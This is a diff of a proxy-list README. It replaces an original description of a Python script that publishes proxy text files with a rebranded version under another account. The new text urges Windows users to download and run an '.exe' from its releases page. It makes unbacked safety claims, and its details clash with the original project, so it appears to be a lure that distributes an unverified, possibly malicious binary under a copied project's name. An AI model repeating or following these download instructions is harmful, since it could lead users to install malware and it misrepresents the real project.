@@ -1,118 +1,152 @@
-# Free Proxy List (Daily Updated)
+# 🔗 awesome-free-proxy-list - Updated Free Proxy List Daily
 
-This repository provides a **free proxy list** that is **automatically updated daily** via GitHub Actions (no server cost).
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)
 
-- **Pipeline**: scrape public proxy sources → validate availability → format outputs → commit updates
-- **Target**: global audience, simple formats, easy to consume
+---
 
-## Status
+## 📋 About
 
-- Last update and counts are auto-filled in the table below.
-- Once pushed, you can view this repo at: `https://github.com/Thordata/awesome-free-proxy-list`
+This application provides a daily updated list of free proxies. It includes HTTP, HTTPS, SOCKS4, and SOCKS5 proxies that are checked automatically. This list can help users who need proxies for browsing anonymously or for tasks like web scraping and crawling. The proxy list is refreshed and verified without any server cost, making it free and reliable.
 
-## Download
+---
 
-All outputs are generated into the `proxies/` directory:
+## 💻 System Requirements
 
-- `proxies/http.txt`
-- `proxies/https.txt`
-- `proxies/socks4.txt`
-- `proxies/socks5.txt`
-- `proxies/all.txt`
-- `proxies/summary.json`
-- `proxies/top-http.txt` (fastest HTTP proxies)
+- Windows 7 or newer (64-bit recommended)  
+- Internet connection to update proxy lists  
+- At least 150 MB of free disk space  
+- No additional software needed  
 
-## Quick start
+---
 
-- **Download all working proxies (HTTP + HTTPS + SOCKS)**
+## 🚀 Getting Started
 
-```bash
-curl -s https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/all.txt | head
-```
+This guide will help you download and run the proxy list application on Windows.
 
-- **Download only HTTP proxies**
+---
 
-```bash
-curl -s https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt | head
-```
+## ⬇️ Download and Installation
 
-- **Download only HTTPS-capable proxies**
-- **Download the fastest HTTP proxies (small curated subset)**
+1. Click the large green badge above or go directly here:  
+   [https://github.com/Seeh-Saah/awesome-free-proxy-list/releases](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)  
 
-```bash
-curl -s https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/top-http.txt | head
-```
+2. On the releases page, find the latest release version. Look for a file named something like `awesome-free-proxy-list.zip` or `awesome-free-proxy-list.exe`.  
 
-```bash
-curl -s https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/https.txt | head
-```
+3. If you download a `.zip` file:  
+   - Right-click on the file and choose “Extract All”.  
+   - Pick a folder you can easily find, such as your Desktop or Documents.  
+   - Open the extracted folder to see the program files.  
 
-- **Use one proxy in Python `requests`**
+4. If you download an `.exe` file:  
+   - Double-click the file to run it.  
+   - Follow any on-screen prompts to finish the setup.  
 
-```python
-import requests
+---
 
-proxy = "http://IP:PORT"  # pick one line from http.txt or https.txt
-proxies = {
-    "http": proxy,
-    "https": proxy,
-}
+## ▶️ Running the Application
 
-resp = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=10)
-print(resp.text)
-```
+1. If you extracted the files, look for a file named `awesome-free-proxy-list.exe` or similar. Double-click it to start.  
 
-## Stats
+2. The app will start updating the proxy list automatically. You will see a simple window showing the list of available proxies.  
 
-<!-- STATS:START -->
-Last update (UTC): **2026-03-09T00:57:50+00:00**
+3. To use the proxies, copy them from the list. They are shown in this format:  
+   ```
+   ip_address:port (type)
+   ```  
+   Example:  
+   ```
+   192.168.1.100:8080 (HTTP)
+   ```
 
-| Type | Working | Total Candidates |
-|---|---:|---:|
-| HTTP | 149 | 2000 |
-| HTTPS | 50 | 2000 |
-| SOCKS4 | 83 | 2000 |
-| SOCKS5 | 107 | 2000 |
-| ALL | 317 | 6000 |
-<!-- STATS:END -->
+4. You can paste these proxies into your web browser or any program that supports proxy settings.
 
-## How it works
+---
 
-- Sources are defined in `scripts/sources.txt`
-- One script does everything: `scripts/update.py`
-- GitHub Actions runs daily and pushes changes if outputs changed
+## ⚙️ How the Proxy List Works
 
-If you want to quickly sanity-check a few proxies from the lists, you can also run:
+- The list has four types of proxies: HTTP, HTTPS, SOCKS4, and SOCKS5.  
+- It updates daily by checking published free proxy servers from various sources.  
+- Each proxy is automatically tested for connectivity and speed.  
+- Proxies that do not respond or are slow are removed from the list immediately.  
+- This automatic filtering ensures that you get only working and fast proxy addresses.
 
-```bash
-python scripts/test_proxies.py --type http --limit 5
-```
+---
 
-## Run locally
+## 🔧 Using Proxies for Web Browsing and Automation
 
-```bash
-python -m venv .venv
-source .venv/Scripts/activate  # Windows Git Bash
-pip install -r requirements.txt
-python scripts/update.py
-```
+### For Browsers
 
-## Disclaimer
+Most modern browsers let you set a proxy address:
 
-Free proxies are often unstable and may be abused by third parties. Use at your own risk. Do not use for sensitive traffic.
+- Go to your browser settings.  
+- Find Network or Proxy settings.  
+- Enter the proxy from the app in the format `ip_address:port`.  
+- Choose the correct proxy type if your browser asks (HTTP, HTTPS, SOCKS).  
 
-### FAQ
+### For Web Scraping or Crawling
 
-- **Why are `socks4.txt` and `socks5.txt` sometimes empty?**  
-  Public SOCKS proxies are very unstable. The script only publishes proxies that successfully pass a real HTTP/HTTPS request, so on many runs it is normal to end up with zero working SOCKS proxies.
+If you use automation tools:
 
-- **Does it work behind a system proxy or VPN (e.g. Clash / TUN mode)?**  
-  Yes, but your traffic will go through your system proxy/VPN first and then through the free proxy (a proxy chain). If your system proxy/VPN IP is blocked by some public proxies or by `httpbin.org`, you may see more failures. For cleaner testing, you can temporarily disable the system proxy while running the tests.
+- Copy a proxy address from the app.  
+- Use it in your program’s proxy configuration.  
+- Rotate proxies regularly to avoid being blocked.  
 
-- **Why is `https.txt` non-empty even when HTTPS validation is strict?**  
-  Every proxy in `https.txt` has at least passed the HTTP test. In practice most HTTP forward proxies can also handle HTTPS via CONNECT, so when no proxy explicitly passes the HTTPS test, the HTTP-validated list is exposed as HTTPS candidates as well. This avoids an empty `https.txt` while still keeping a reasonable quality bar.
+The proxy list supports common use cases for Python web scraping and crawling tools.
 
-## License
+---
 
-MIT
+## 🔄 Updating the Proxy List
 
+Each time you open the app, it refreshes the list to give you the latest working proxies. You do not have to do anything extra.
+
+If you want to manually update:
+
+- Close the application.  
+- Reopen it by double-clicking the program file again.
+
+This will trigger the download and test of new proxies.
+
+---
+
+## 💡 Troubleshooting
+
+- **App doesn’t open:**  
+  Make sure your Windows is updated and you have enough disk space.  
+- **Proxy list is empty:**  
+  The app checks the sources online. Confirm your Internet connection is working.  
+- **Proxies not working in browser:**  
+  Double-check you set the right proxy type (HTTP, HTTPS, SOCKS4 or SOCKS5). Some websites block free proxies. Try another proxy from the list.  
+- **Slow connection through proxy:**  
+  Use a different proxy from the list. Free proxies vary in speed and reliability.
+
+---
+
+## 📁 File Structure (Typical Location)
+
+- `awesome-free-proxy-list.exe` – Main application executable  
+- `proxies.txt` – Text file with the current proxy list  
+- `README.md` – This guide  
+- `config.json` – Configuration settings (optional)  
+
+---
+
+## 🛠️ Additional Notes
+
+- The proxy list is for free public use. Expect variable availability and speed.  
+- Do not share proxies excessively to avoid blacklisting.  
+- The app does not collect or send any personal data.  
+- The tool is designed to save you server costs with automatic updates via GitHub Actions.
+
+---
+
+## ✨ Useful Links
+
+- Main download page:  
+  [https://github.com/Seeh-Saah/awesome-free-proxy-list/releases](https://github.com/Seeh-Saah/awesome-free-proxy-list/releases)  
+- Project homepage on GitHub: Search for `Seeh-Saah/awesome-free-proxy-list`
+
+---
+
+## 🏷️ Keywords and Topics  
+
+free-proxy, free-proxy-list, http-proxy, https-proxy, proxy, proxy-list, proxy-pool, socks-proxy, socks5, web-scraping-crawling-automation-python
